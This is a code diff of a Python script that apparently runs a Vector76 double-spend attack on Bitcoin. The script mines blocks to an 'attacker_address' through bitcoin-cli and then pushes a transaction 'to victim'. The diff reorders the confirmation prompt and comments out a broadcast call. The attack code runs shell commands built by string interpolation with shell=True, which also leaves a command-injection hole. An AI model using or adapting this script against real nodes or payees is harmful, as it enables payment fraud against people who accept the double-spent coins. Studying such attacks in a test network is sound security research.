@@ -34,14 +34,14 @@ def to_satoshi(btc_amount):
 def generate_block(address, block, submit=False):
     subprocess.run(f'bitcoin-cli generateblock {address} ["{block}"] {str(submit).lower()}',
                              shell=True,
-                             capture_output=True, 
+                             capture_output=True,
                              text=True,
                              check=True)
 
 def send_rawtransaction(hextx):
     result = subprocess.run(f'bitcoin-cli sendrawtransaction {hextx}',
                              shell=True,
-                             capture_output=True, 
+                             capture_output=True,
                              text=True,
                              check=True)
     return result.stdout
@@ -132,14 +132,14 @@ print(f"Testnet Mode              : {testnet}")
 print("--------------------")
 print()
 print()
-input("--- Are you sure you want to continue? Press Enter to continue. ---")
-print()
 print(f"Generating Vector76 Block")
-send_rawtransaction(vector76_block)
+#send_rawtransaction(vector76_block)
 for i in range(6):
     print(f" {i + 1} / 6   ...")
     generate_block(attacker_address, vector76_block)
 
+input("--- Are you sure you want to continue? Press Enter to continue. ---")
+print()
 print("Sending V1 Transaction to victim...")
 transaction_util.pushtx(tx_victim)
 print()
